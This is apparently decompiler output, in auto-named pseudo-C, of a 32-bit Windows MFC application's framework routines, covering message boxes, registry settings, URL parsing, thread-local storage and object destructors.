//----- (0041BB8B) --------------------------------------------------------
int __thiscall sub_41BB8B(_DWORD *this, int a2)
{
  int v2; // ecx
  int result; // eax

  v2 = this[42];
  if ( v2 )
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 4))(v2, a2);
  return result;
}

//----- (0041BBD5) --------------------------------------------------------
int __thiscall sub_41BBD5(_DWORD *this, int a2)
{
  int v2; // ecx

  v2 = this[32];
  if ( v2 )
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 48))(v2, a2);
  else
    return 0;
}

//----- (0041BC22) --------------------------------------------------------
int __stdcall sub_41BC22(int a1)
{
  int result; // eax
  int v2; // esi
  int v3; // ecx

  result = sub_40A780();
  v2 = result;
  if ( result )
  {
    result = (*(int (__thiscall **)(int))(*(_DWORD *)result + 176))(result);
    if ( result )
    {
      v3 = *(_DWORD *)(v2 + 104);
      if ( v3 )
        return (*(int (__thiscall **)(int, int))(*(_DWORD *)v3 + 100))(v3, a1);
    }
  }
  return result;
}

//----- (0041BC50) --------------------------------------------------------
int __thiscall sub_41BC50(int *this, LPCSTR lpText, UINT uType, int a4)
{
  int *v5; // esi
  LRESULT v6; // eax
  UINT v7; // ebx
  UINT v8; // eax
  CHAR *v9; // edi
  int v10; // edi
  CHAR Filename[260]; // [esp+Ch] [ebp-114h] BYREF
  int *v13; // [esp+110h] [ebp-10h]
  HWND v14; // [esp+114h] [ebp-Ch]
  int v15; // [esp+118h] [ebp-8h]
  HWND hWnd; // [esp+11Ch] [ebp-4h] BYREF

  v13 = this;
  sub_41BC22(0);
  v5 = 0;
  v14 = sub_41BDC8(0, &hWnd);
  if ( v14 && (v6 = SendMessageA(hWnd, 0x376u, 0, 0)) != 0 )
  {
    v5 = (int *)v6;
  }
  else if ( this )
  {
    v5 = this + 39;
  }
  v15 = 0;
  if ( v5 )
  {
    v15 = *v5;
    if ( a4 )
      *v5 = a4 + 196608;
  }
  v7 = uType;
  if ( (uType & 0xF0) == 0 )
  {
    v8 = uType & 0xF;
    if ( v8 <= 1 || v8 > 2 && v8 <= 4 )
      v7 = uType | 0x30;
  }
  if ( this )
  {
    v9 = (CHAR *)this[30];
  }
  else
  {
    v9 = Filename;
    GetModuleFileNameA(0, Filename, 0x104u);
  }
  v10 = MessageBoxA(v14, lpText, v9, v7);
  if ( v5 )
    *v5 = v15;
  if ( hWnd )
    EnableWindow(hWnd, 1);
  sub_41BC22(1);
  return v10;
}

//----- (0041BD37) --------------------------------------------------------
int __stdcall sub_41BD37(LPCSTR lpText, UINT uType, int a3)
{
  int v3; // eax

  v3 = *((_DWORD *)AfxGetModuleState() + 1);
  if ( v3 )
    return (*(int (__thiscall **)(int, LPCSTR, UINT, int))(*(_DWORD *)v3 + 140))(v3, lpText, uType, a3);
  else
    return sub_41BC50(0, lpText, uType, a3);
}

//----- (0041BD6F) --------------------------------------------------------
int __stdcall sub_41BD6F(unsigned int a1, UINT uType, int a3)
{
  int v3; // eax
  int v4; // eax
  int v5; // esi
  LPCSTR lpText; // [esp+0h] [ebp-10h] BYREF
  int v8; // [esp+Ch] [ebp-4h]

  lpText = (LPCSTR)off_4276D4;
  v8 = 0;
  CString::LoadStringA((CString *)&lpText, a1);
  v3 = a3;
  if ( a3 == -1 )
    v3 = a1;
  v4 = sub_41BD37(lpText, uType, v3);
  v8 = -1;
  v5 = v4;
  sub_417CB2(&lpText);
  return v5;
}
// 4276D4: using guessed type void *off_4276D4;

//----- (0041BDC8) --------------------------------------------------------
HWND __stdcall sub_41BDC8(HWND hWnd, HWND *a2)
{
  HWND i; // esi
  int v3; // eax
  HWND v4; // edi
  HWND j; // eax

  i = hWnd;
  if ( hWnd )
    goto LABEL_17;
  v3 = unknown_libname_33();
  if ( v3 || (v3 = sub_40A780()) != 0 )
  {
    for ( i = *(HWND *)(v3 + 28); i; i = GetParent(i) )
    {
LABEL_17:
      if ( (GetWindowLongA(i, -16) & 0x40000000) == 0 )
        break;
    }
  }
  else
  {
    i = 0;
  }
  v4 = i;
  for ( j = i; j; j = GetParent(j) )
    v4 = j;
  if ( !hWnd && i )
    i = GetLastActivePopup(i);
  if ( a2 )
  {
    if ( v4 && IsWindowEnabled(v4) && v4 != i )
    {
      *a2 = v4;
      EnableWindow(v4, 0);
    }
    else
    {
      *a2 = 0;
    }
  }
  return i;
}
// 41BE64: using guessed type int unknown_libname_33(void);

//----- (0041BE70) --------------------------------------------------------
HKEY __thiscall sub_41BE70(int this, LPCSTR lpAppName, LPCSTR lpValueName, int Data)
{
  HKEY result; // eax
  HKEY v6; // esi
  LSTATUS v7; // edi
  CHAR String[16]; // [esp+4h] [ebp-10h] BYREF

  if ( *(_DWORD *)(this + 124) )
  {
    result = CWinApp::GetSectionKey((CWinApp *)this, lpAppName);
    v6 = result;
    if ( result )
    {
      v7 = RegSetValueExA(result, lpValueName, 0, 4u, (const BYTE *)&Data, 4u);
      RegCloseKey(v6);
      return (HKEY)(v7 == 0);
    }
  }
  else
  {
    wsprintfA(String, "%d", Data);
    return (HKEY)WritePrivateProfileStringA(lpAppName, lpValueName, String, *(LPCSTR *)(this + 144));
  }
  return result;
}

//----- (0041C01E) --------------------------------------------------------
void __stdcall sub_41C01E(struct CString *a1, UINT uID, char *a3)
{
  AfxFormatStrings(a1, uID, (const char *const *)&a3, 1);
}

//----- (0041C04E) --------------------------------------------------------
BOOL __stdcall sub_41C04E(
        LPCSTR lpszUrl,
        LPURL_COMPONENTSA lpUrlComponents,
        _DWORD *a3,
        INTERNET_PORT *a4,
        DWORD dwFlags)
{
  DWORD v5; // esi
  void *v6; // ebx
  BOOL v8; // edi
  _DWORD *v9; // eax
  CHAR szBuffer[2084]; // [esp+Ch] [ebp-82Ch] BYREF
  int v11; // [esp+830h] [ebp-8h]
  DWORD dwBufferLength; // [esp+834h] [ebp-4h] BYREF
  DWORD dwFlagsa; // [esp+850h] [ebp+18h]

  if ( !lpUrlComponents || !lpszUrl )
    return 0;
  v11 = 0;
  v5 = dwFlags & 0x3E000000;
  dwFlagsa = dwFlags & 0xC0000000;
  dwBufferLength = 2084;
  if ( InternetCanonicalizeUrlA(lpszUrl, szBuffer, &dwBufferLength, v5) )
  {
    v6 = szBuffer;
  }
  else
  {
    if ( GetLastError() != 122 )
      return 0;
    v6 = sub_4179F3(dwBufferLength);
    v11 = 1;
    if ( !InternetCanonicalizeUrlA(lpszUrl, (LPSTR)v6, &dwBufferLength, v5) )
    {
      sub_417A1C(v6);
      return 0;
    }
  }
  v8 = InternetCrackUrlA((LPCSTR)v6, 0, dwFlagsa, lpUrlComponents);
  if ( v11 )
    sub_417A1C(v6);
  if ( v8 )
  {
    *a4 = lpUrlComponents->nPort;
    switch ( lpUrlComponents->nScheme )
    {
      case INTERNET_SCHEME_FTP:
        *a3 = 1;
        return v8;
      case INTERNET_SCHEME_GOPHER:
        *a3 = 2;
        return v8;
      case INTERNET_SCHEME_HTTP:
        *a3 = 3;
        return v8;
      case INTERNET_SCHEME_HTTPS:
        *a3 = 4107;
        return v8;
      case INTERNET_SCHEME_FILE:
        *a3 = 4097;
        return v8;
      case INTERNET_SCHEME_NEWS:
        *a3 = 4102;
        return v8;
    }
    v9 = a3;
    if ( lpUrlComponents->nScheme == INTERNET_SCHEME_MAILTO )
    {
      *a3 = 4098;
      return v8;
    }
  }
  else
  {
    v9 = a3;
  }
  *v9 = 4096;
  return v8;
}

//----- (0041C182) --------------------------------------------------------
BOOL __stdcall sub_41C182(
        LPCSTR lpszUrl,
        _DWORD *a2,
        CString *a3,
        CString *a4,
        INTERNET_PORT *a5,
        CString *a6,
        CString *a7,
        DWORD dwFlags)
{
  BOOL v9; // edi
  struct $BC2FB811D417144E831EE3AEA4A279C8 UrlComponents; // [esp+4h] [ebp-3Ch] BYREF

  *a2 = 4096;
  if ( !lpszUrl )
    return 0;
  memset(&UrlComponents, 0, sizeof(UrlComponents));
  UrlComponents.dwStructSize = 60;
  UrlComponents.dwHostNameLength = 256;
  UrlComponents.lpszHostName = (LPSTR)sub_417F33(a3, 257);
  UrlComponents.dwUrlPathLength = 2048;
  UrlComponents.lpszUrlPath = (LPSTR)sub_417F33(a4, 2049);
  UrlComponents.dwUserNameLength = 128;
  UrlComponents.lpszUserName = (LPSTR)sub_417F33(a6, 129);
  UrlComponents.dwPasswordLength = 128;
  UrlComponents.lpszPassword = (LPSTR)sub_417F33(a7, 129);
  v9 = sub_41C04E(lpszUrl, &UrlComponents, a2, a5, dwFlags);
  CString::ReleaseBuffer(a3, -1);
  CString::ReleaseBuffer(a4, -1);
  CString::ReleaseBuffer(a6, -1);
  CString::ReleaseBuffer(a7, -1);
  return v9;
}

//----- (0041C24F) --------------------------------------------------------
int __thiscall sub_41C24F(int this)
{
  sub_416AD8((_DWORD *)this, 10);
  unknown_libname_18(0);
  *(_DWORD *)(this + 28) = &CCriticalSection::`vftable';
  InitializeCriticalSection((LPCRITICAL_SECTION)(this + 36));
  *(_DWORD *)this = &CSessionMapPtrToPtr::`vftable';
  return this;
}
// 40AF70: using guessed type _DWORD __stdcall unknown_libname_18(_DWORD);
// 42092C: using guessed type void *CSessionMapPtrToPtr::`vftable';
// 42093C: using guessed type void *CCriticalSection::`vftable';

//----- (0041C29E) --------------------------------------------------------
LPVOID __thiscall sub_41C29E(LPVOID lpMem, char a2)
{
  sub_41C2BA((int)lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (0041C2BA) --------------------------------------------------------
int __thiscall sub_41C2BA(int this)
{
  _DWORD *v2; // esi

  *(_DWORD *)this = &CSessionMapPtrToPtr::`vftable';
  v2 = (_DWORD *)(this + 28);
  *(_DWORD *)(this + 28) = &CCriticalSection::`vftable';
  DeleteCriticalSection((LPCRITICAL_SECTION)(this + 36));
  sub_40AF9B(v2);
  return sub_416B8B((_DWORD *)this);
}
// 42092C: using guessed type void *CSessionMapPtrToPtr::`vftable';
// 42093C: using guessed type void *CCriticalSection::`vftable';

//----- (0041C309) --------------------------------------------------------
_DWORD *__thiscall sub_41C309(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  *this = &_AFX_WIN_STATE::`vftable';
  return result;
}
// 4202E0: using guessed type void *_AFX_WIN_STATE::`vftable';

//----- (0041C312) --------------------------------------------------------
void **__thiscall sub_41C312(void **hMem, char a2)
{
  sub_41DE22(hMem);
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}

//----- (0041C417) --------------------------------------------------------
LPVOID __thiscall sub_41C417(LPVOID lpMem, char a2)
{
  sub_41C477((int)lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (0041C473) --------------------------------------------------------
int sub_41C473()
{
  return 1;
}

//----- (0041C477) --------------------------------------------------------
void __thiscall sub_41C477(int this)
{
  int v2; // ecx
  int v3; // ecx
  ATOM v4; // ax
  ATOM v5; // ax
  int v6; // ecx
  struct AFX_MODULE_STATE *ModuleState; // eax

  *(_DWORD *)this = &CWinApp::`vftable';
  v2 = *(_DWORD *)(this + 128);
  if ( v2 )
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v2 + 4))(v2, 1);
  v3 = *(_DWORD *)(this + 168);
  if ( v3 )
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v3 + 20))(v3, 1);
  if ( !*((_BYTE *)AfxGetModuleState() + 20) )
  {
    if ( dword_443890 )
    {
      (*(void (__thiscall **)(int, int))(*(_DWORD *)dword_443890 + 4))(dword_443890, 1);
      dword_443890 = 0;
    }
    if ( dword_44388C )
    {
      (*(void (__thiscall **)(int, int))(*(_DWORD *)dword_44388C + 4))(dword_44388C, 1);
      dword_44388C = 0;
    }
  }
  if ( *(_DWORD *)(this + 148) )
    AfxGlobalFree(*(HGLOBAL *)(this + 148));
  if ( *(_DWORD *)(this + 152) )
    AfxGlobalFree(*(HGLOBAL *)(this + 152));
  v4 = *(_WORD *)(this + 176);
  if ( v4 )
    GlobalDeleteAtom(v4);
  v5 = *(_WORD *)(this + 178);
  if ( v5 )
    GlobalDeleteAtom(v5);
  v6 = *(_DWORD *)(this + 172);
  if ( v6 )
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v6 + 4))(v6, 1);
  ModuleState = AfxGetModuleState();
  if ( *((_DWORD *)ModuleState + 4) == *(_DWORD *)(this + 120) )
    *((_DWORD *)ModuleState + 4) = 0;
  if ( *((_DWORD *)ModuleState + 1) == this )
    *((_DWORD *)ModuleState + 1) = 0;
  sub_40B886(*(LPVOID *)(this + 120));
  sub_40B886(*(LPVOID *)(this + 124));
  sub_40B886(*(LPVOID *)(this + 136));
  sub_40B886(*(LPVOID *)(this + 140));
  sub_40B886(*(LPVOID *)(this + 144));
  *(_DWORD *)(this + 40) = 0;
  CWinThread::~CWinThread((CWinThread *)this);
}
// 4202E8: using guessed type void *CWinApp::`vftable';
// 44388C: using guessed type int dword_44388C;
// 443890: using guessed type int dword_443890;

//----- (0041C5AD) --------------------------------------------------------
HKEY __thiscall sub_41C5AD(_DWORD *this)
{
  int v2; // ecx
  HKEY result; // eax

  v2 = this[42];
  if ( v2 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v2 + 16))(v2);
  result = (HKEY)this[45];
  if ( result )
    return sub_41BE70((int)this, "Settings", "PreviewPages", this[45]);
  return result;
}

//----- (0041C613) --------------------------------------------------------
char **sub_41C613()
{
  return &off_420238;
}
// 420238: using guessed type char *off_420238;

//----- (0041C619) --------------------------------------------------------
int sub_41C619()
{
  nullsub_12();
  return atexit(sub_41C630);
}
// 41C623: using guessed type int nullsub_12(void);

//----- (0041C630) --------------------------------------------------------
void __cdecl sub_41C630()
{
  CProcessLocalObject::~CProcessLocalObject((CProcessLocalObject *)&unk_443888);
}

//----- (0041C63A) --------------------------------------------------------
struct CNoTrackObject *__stdcall sub_41C63A()
{
  _DWORD *v0; // ecx
  struct CNoTrackObject *result; // eax

  v0 = CNoTrackObject::operator new(0x3Cu);
  result = 0;
  if ( v0 )
    return (struct CNoTrackObject *)sub_41CC28(v0);
  return result;
}

//----- (0041C66B) --------------------------------------------------------
CWinThread *__thiscall sub_41C66B(CWinThread *lpMem, char a2)
{
  CWinThread::~CWinThread(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (0041C6F6) --------------------------------------------------------
char **sub_41C6F6()
{
  return &off_420388;
}
// 420388: using guessed type char *off_420388;

//----- (0041C745) --------------------------------------------------------
struct CNoTrackObject *__stdcall sub_41C745()
{
  struct CNoTrackObject *result; // eax

  result = (struct CNoTrackObject *)CNoTrackObject::operator new(4u);
  if ( !result )
    return 0;
  *(_DWORD *)result = &_AFX_CTL3D_THREAD::`vftable';
  return result;
}
// 420438: using guessed type void *_AFX_CTL3D_THREAD::`vftable';

//----- (0041C75A) --------------------------------------------------------
_DWORD *__thiscall sub_41C75A(_DWORD *hMem, char a2)
{
  sub_41D8FE(hMem);
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}

//----- (0041C775) --------------------------------------------------------
_DWORD *__thiscall sub_41C775(_DWORD *hMem, char a2)
{
  sub_41D93F(hMem);
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}

//----- (0041C870) --------------------------------------------------------
char **sub_41C870()
{
  return &off_420600;
}
// 420600: using guessed type char *off_420600;

//----- (0041C876) --------------------------------------------------------
int sub_41C876()
{
  unknown_libname_34();
  return atexit(sub_41C89E);
}
// 41C880: using guessed type int unknown_libname_34(void);

//----- (0041C89E) --------------------------------------------------------
void __cdecl sub_41C89E()
{
  sub_40A7E7(dword_4439E0);
}
// 4439E0: using guessed type _DWORD dword_4439E0[38];

//----- (0041C8A8) --------------------------------------------------------
char **sub_41C8A8()
{
  return &off_4205D8;
}
// 4205D8: using guessed type char *off_4205D8;

//----- (0041C8AE) --------------------------------------------------------
int sub_41C8AE()
{
  unknown_libname_35();
  return atexit(sub_41C8D6);
}
// 41C8B8: using guessed type int unknown_libname_35(void);

//----- (0041C8D6) --------------------------------------------------------
void __cdecl sub_41C8D6()
{
  sub_40A834(dword_443948);
}
// 443948: using guessed type _DWORD dword_443948[38];

//----- (0041C8F7) --------------------------------------------------------
void ***sub_41C8F7()
{
  return &off_4205B8;
}
// 4205B8: using guessed type void **off_4205B8;

//----- (0041C917) --------------------------------------------------------
char **sub_41C917()
{
  return &off_420590;
}
// 420590: using guessed type char *off_420590;

//----- (0041C943) --------------------------------------------------------
unsigned int *__thiscall sub_41C943(unsigned int *this, char a2)
{
  sub_41C963(this);
  if ( (a2 & 1) != 0 )
    sub_40AF44((int)&unk_443AA0, this);
  return this;
}

//----- (0041C968) --------------------------------------------------------
char **sub_41C968()
{
  return &off_420570;
}
// 420570: using guessed type char *off_420570;

//----- (0041C98A) --------------------------------------------------------
unsigned int *__thiscall sub_41C98A(unsigned int *this, char a2)
{
  sub_41C9AA(this);
  if ( (a2 & 1) != 0 )
    sub_40AF44((int)&unk_443A78, this);
  return this;
}

//----- (0041C9AA) --------------------------------------------------------
BOOL __thiscall sub_41C9AA(unsigned int *this)
{
  *this = (unsigned int)&CGdiObject::`vftable';
  return sub_41B3A3(this);
}
// 4206A8: using guessed type void *CGdiObject::`vftable';

//----- (0041C9D3) --------------------------------------------------------
char **sub_41C9D3()
{
  return &off_420548;
}
// 420548: using guessed type char *off_420548;

//----- (0041C9D9) --------------------------------------------------------
int sub_41C9D9()
{
  sub_41C9E3();
  return atexit(unknown_libname_36);
}

//----- (0041C9E3) --------------------------------------------------------
char *sub_41C9E3()
{
  return sub_40AE51(byte_443AA0, 16, 64);
}

//----- (0041CA19) --------------------------------------------------------
int sub_41CA19()
{
  sub_41CA23();
  return atexit(unknown_libname_37);
}

//----- (0041CA23) --------------------------------------------------------
char *sub_41CA23()
{
  return sub_40AE51(byte_443A78, 8, 64);
}

//----- (0041CA70) --------------------------------------------------------
char *__thiscall sub_41CA70(char *hMem, char a2)
{
  sub_41CA8B(hMem);
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}

//----- (0041CA8B) --------------------------------------------------------
void __thiscall sub_41CA8B(char *this)
{
  int v2; // ecx
  _DWORD *v3; // edi
  void *v4; // esi

  *(_DWORD *)this = &_AFX_THREAD_STATE::`vftable';
  v2 = *((_DWORD *)this + 51);
  v3 = this + 204;
  if ( v2 )
  {
    (*(void (__thiscall **)(int))(*(_DWORD *)v2 + 88))(v2);
    if ( *v3 )
      (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)*v3 + 4))(*v3, 1);
  }
  if ( *((_DWORD *)this + 12) )
    UnhookWindowsHookEx(*((HHOOK *)this + 12));
  if ( *((_DWORD *)this + 11) )
    UnhookWindowsHookEx(*((HHOOK *)this + 11));
  v4 = (void *)*((_DWORD *)this + 3);
  if ( v4 )
    sub_40B886(v4);
}
// 420770: using guessed type void *_AFX_THREAD_STATE::`vftable';

//----- (0041CB0F) --------------------------------------------------------
int sub_41CB0F()
{
  nullsub_13();
  return atexit(sub_41CB26);
}
// 41CB19: using guessed type int nullsub_13(void);

//----- (0041CB26) --------------------------------------------------------
void __cdecl sub_41CB26()
{
  CThreadLocalObject::~CThreadLocalObject((CThreadLocalObject *)&unk_443ACC);
}

//----- (0041CB98) --------------------------------------------------------
_DWORD *__thiscall sub_41CB98(_DWORD *hMem, char a2)
{
  sub_41CBB3(hMem);
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}

//----- (0041CBB3) --------------------------------------------------------
void __thiscall sub_41CBB3(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  int v3; // ecx
  _DWORD *v4; // edi

  *this = &AFX_MODULE_STATE::`vftable';
  v2 = (void (__thiscall ***)(_DWORD, int))this[1041];
  if ( v2 )
    (**v2)(v2, 1);
  v3 = this[1051];
  v4 = this + 1051;
  if ( v3 )
  {
    (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v3 + 12))(v3, this + 1042);
    if ( *v4 )
      (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)*v4 + 4))(*v4, 1);
  }
  CThreadLocalObject::~CThreadLocalObject((CThreadLocalObject *)(this + 1052));
}
// 420778: using guessed type void *AFX_MODULE_STATE::`vftable';

//----- (0041CC28) --------------------------------------------------------
_DWORD *__thiscall sub_41CC28(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  this[2] = 0;
  this[3] = 0;
  *this = &AFX_MODULE_THREAD_STATE::`vftable';
  this[3] = 84;
  this[10] = sub_4179D9;
  return result;
}
// 4179D9: using guessed type void __noreturn sub_4179D9();
// 420780: using guessed type void *AFX_MODULE_THREAD_STATE::`vftable';

//----- (0041CC47) --------------------------------------------------------
_DWORD *__thiscall sub_41CC47(_DWORD *hMem, char a2)
{
  sub_41CC62(hMem);
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}

//----- (0041CC62) --------------------------------------------------------
void __thiscall sub_41CC62(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  void (__thiscall ***v3)(_DWORD, int); // ecx
  void (__thiscall ***v4)(_DWORD, int); // ecx
  void (__thiscall ***v5)(_DWORD, int); // ecx
  void (__thiscall ***v6)(_DWORD, int); // ecx
  _DWORD *v7; // ecx
  void *v8; // eax
  int v9; // ecx
  int v10; // ecx
  int v11; // ecx

  *this = &AFX_MODULE_THREAD_STATE::`vftable';
  v2 = (void (__thiscall ***)(_DWORD, int))this[5];
  if ( v2 )
    (**v2)(v2, 1);
  v3 = (void (__thiscall ***)(_DWORD, int))this[6];
  if ( v3 )
    (**v3)(v3, 1);
  v4 = (void (__thiscall ***)(_DWORD, int))this[7];
  if ( v4 )
    (**v4)(v4, 1);
  v5 = (void (__thiscall ***)(_DWORD, int))this[8];
  if ( v5 )
    (**v5)(v5, 1);
  v6 = (void (__thiscall ***)(_DWORD, int))this[9];
  if ( v6 )
    (**v6)(v6, 1);
  v7 = (_DWORD *)this[14];
  if ( v7 )
  {
    while ( v7[3] )
    {
      v8 = (void *)sub_416A7E(v7);
      sub_417A1C(v8);
      v7 = (_DWORD *)this[14];
    }
  }
  v9 = this[12];
  if ( v9 )
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v9 + 4))(v9, 1);
  v10 = this[13];
  if ( v10 )
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v10 + 4))(v10, 1);
  v11 = this[14];
  if ( v11 )
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v11 + 4))(v11, 1);
}
// 420780: using guessed type void *AFX_MODULE_THREAD_STATE::`vftable';

//----- (0041CD10) --------------------------------------------------------
int sub_41CD10()
{
  nullsub_14();
  return atexit(sub_41CD27);
}
// 41CD1A: using guessed type int nullsub_14(void);

//----- (0041CD27) --------------------------------------------------------
void __cdecl sub_41CD27()
{
  CProcessLocalObject::~CProcessLocalObject((CProcessLocalObject *)&unk_443AC8);
}

//----- (0041CDCB) --------------------------------------------------------
_DWORD *__thiscall sub_41CDCB(_DWORD *hMem, char a2)
{
  sub_41CDE6(hMem);
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}

//----- (0041CE02) --------------------------------------------------------
char **sub_41CE02()
{
  return &off_4278E0;
}
// 4278E0: using guessed type char *off_4278E0;

//----- (0041CE0D) --------------------------------------------------------
void sub_41CE0D()
{
  sub_41805E(&off_4278E0);
}
// 4278E0: using guessed type char *off_4278E0;

//----- (0041CE18) --------------------------------------------------------
char **sub_41CE18()
{
  return &off_4207D8;
}
// 4207D8: using guessed type char *off_4207D8;

//----- (0041CE1E) --------------------------------------------------------
char **sub_41CE1E()
{
  return &off_420850;
}
// 420850: using guessed type char *off_420850;

//----- (0041CE24) --------------------------------------------------------
int sub_41CE24()
{
  unknown_libname_38();
  return atexit(sub_41CE4C);
}
// 41CE2E: using guessed type int unknown_libname_38(void);

//----- (0041CE4C) --------------------------------------------------------
void __cdecl sub_41CE4C()
{
  sub_40AAED(dword_443B70);
}
// 443B70: using guessed type _DWORD dword_443B70[38];

//----- (0041CE56) --------------------------------------------------------
char **sub_41CE56()
{
  return &off_420820;
}
// 420820: using guessed type char *off_420820;

//----- (0041CE5C) --------------------------------------------------------
int sub_41CE5C()
{
  unknown_libname_39();
  return atexit(sub_41CE84);
}
// 41CE66: using guessed type int unknown_libname_39(void);

//----- (0041CE84) --------------------------------------------------------
void __cdecl sub_41CE84()
{
  sub_40AB3A(dword_443AD8);
}
// 443AD8: using guessed type _DWORD dword_443AD8[38];

//----- (0041CE8E) --------------------------------------------------------
int sub_41CE8E()
{
  nullsub_15();
  return atexit(sub_41CEA5);
}
// 41CE98: using guessed type int nullsub_15(void);

//----- (0041CEA5) --------------------------------------------------------
void __cdecl sub_41CEA5()
{
  CProcessLocalObject::~CProcessLocalObject((CProcessLocalObject *)&unk_443C08);
}

//----- (0041CEC9) --------------------------------------------------------
int sub_41CEC9()
{
  sub_41CED3();
  return atexit(sub_41CEE9);
}

//----- (0041CED3) --------------------------------------------------------
int sub_41CED3()
{
  return sub_41C24F((int)&unk_443C10);
}

//----- (0041CEE9) --------------------------------------------------------
void __cdecl sub_41CEE9()
{
  sub_41C2BA((int)&unk_443C10);
}

//----- (0041CF06) --------------------------------------------------------
int __thiscall sub_41CF06(int *this, int a2)
{
  int v2; // edx
  int result; // eax
  int v4; // ecx
  int v5; // edi

  v2 = *this;
  if ( !*this )
    return 0;
  result = 0;
  if ( v2 == a2 )
  {
    *this = *(_DWORD *)(this[1] + a2);
    return 1;
  }
  if ( v2 )
  {
    v4 = this[1];
    do
    {
      v5 = *(_DWORD *)(v4 + v2);
      if ( v5 == a2 )
        break;
      v2 = *(_DWORD *)(v4 + v2);
    }
    while ( v5 );
    if ( v2 )
    {
      *(_DWORD *)(v4 + v2) = *(_DWORD *)(v4 + a2);
      return 1;
    }
  }
  return result;
}

//----- (0041D017) --------------------------------------------------------
int __thiscall sub_41D017(int this)
{
  int v2; // ebp
  int v3; // edi
  _BYTE *v4; // eax
  const void *v5; // eax
  int v6; // ebp
  HGLOBAL v7; // eax
  HGLOBAL v8; // ebx
  HGLOBAL v9; // eax
  char *v10; // ebx
  int v12; // [esp-4h] [ebp-18h]
  struct _RTL_CRITICAL_SECTION *lpCriticalSection; // [esp+10h] [ebp-4h]

  lpCriticalSection = (struct _RTL_CRITICAL_SECTION *)(this + 28);
  EnterCriticalSection((LPCRITICAL_SECTION)(this + 28));
  v2 = *(_DWORD *)(this + 4);
  v3 = *(_DWORD *)(this + 8);
  if ( v3 >= v2 || (*(_BYTE *)(*(_DWORD *)(this + 16) + 8 * v3) & 1) != 0 )
  {
    v3 = 1;
    if ( v2 <= 1 )
      goto LABEL_8;
    v4 = (_BYTE *)(*(_DWORD *)(this + 16) + 8);
    do
    {
      if ( (*v4 & 1) == 0 )
        break;
      ++v3;
      v4 += 8;
    }
    while ( v3 < v2 );
    if ( v3 >= v2 )
    {
LABEL_8:
      v5 = *(const void **)(this + 16);
      v6 = v2 + 32;
      if ( v5 )
      {
        v8 = GlobalHandle(v5);
        GlobalUnlock(v8);
        v7 = GlobalReAlloc(v8, 8 * v6, 0x2002u);
      }
      else
      {
        v7 = GlobalAlloc(0x2002u, 8 * v6);
      }
      if ( !v7 )
      {
        v9 = GlobalHandle(*(LPCVOID *)(this + 16));
        GlobalLock(v9);
        LeaveCriticalSection(lpCriticalSection);
        sub_4166EF(v12);
      }
      v10 = (char *)GlobalLock(v7);
      memset(&v10[8 * *(_DWORD *)(this + 4)], 0, 8 * (v6 + 0x1FFFFFFF * *(_DWORD *)(this + 4)));
      *(_DWORD *)(this + 16) = v10;
      *(_DWORD *)(this + 4) = v6;
    }
  }
  if ( v3 >= *(_DWORD *)(this + 12) )
    *(_DWORD *)(this + 12) = v3 + 1;
  *(_DWORD *)(*(_DWORD *)(this + 16) + 8 * v3) |= 1u;
  *(_DWORD *)(this + 8) = v3 + 1;
  LeaveCriticalSection(lpCriticalSection);
  return v3;
}
// 41D0C9: variable 'v12' is possibly undefined

//----- (0041D186) --------------------------------------------------------
int __thiscall sub_41D186(int this, int a2, int a3)
{
  _DWORD *Value; // edi
  _DWORD *v5; // ebx
  _DWORD *v6; // eax
  void *v7; // eax
  HLOCAL v8; // eax
  int result; // eax
  int v10; // [esp+0h] [ebp-10h]

  Value = TlsGetValue(*(_DWORD *)this);
  if ( Value )
  {
    v5 = Value + 2;
    if ( a2 < Value[2] || !a3 )
      goto LABEL_15;
  }
  else
  {
    v6 = CNoTrackObject::operator new(0x10u);
    if ( v6 )
    {
      *v6 = &CThreadData::`vftable';
      Value = v6;
    }
    else
    {
      Value = 0;
    }
    Value[2] = 0;
    Value[3] = 0;
    v5 = Value + 2;
    EnterCriticalSection((LPCRITICAL_SECTION)(this + 28));
    CSimpleList::AddHead((CSimpleList *)(this + 20), Value);
    LeaveCriticalSection((LPCRITICAL_SECTION)(this + 28));
  }
  v7 = (void *)Value[3];
  if ( v7 )
    v8 = LocalReAlloc(v7, 4 * *(_DWORD *)(this + 12), 2u);
  else
    v8 = LocalAlloc(0, 4 * *(_DWORD *)(this + 12));
  Value[3] = v8;
  if ( !v8 )
    sub_4166EF(v10);
  memset((void *)(Value[3] + 4 * *v5), 0, 4 * (*(_DWORD *)(this + 12) + 0x3FFFFFFF * *v5));
  *v5 = *(_DWORD *)(this + 12);
  TlsSetValue(*(_DWORD *)this, Value);
LABEL_15:
  result = Value[3];
  *(_DWORD *)(result + 4 * a2) = a3;
  return result;
}
// 41D228: variable 'v10' is possibly undefined
// 420958: using guessed type void *CThreadData::`vftable';

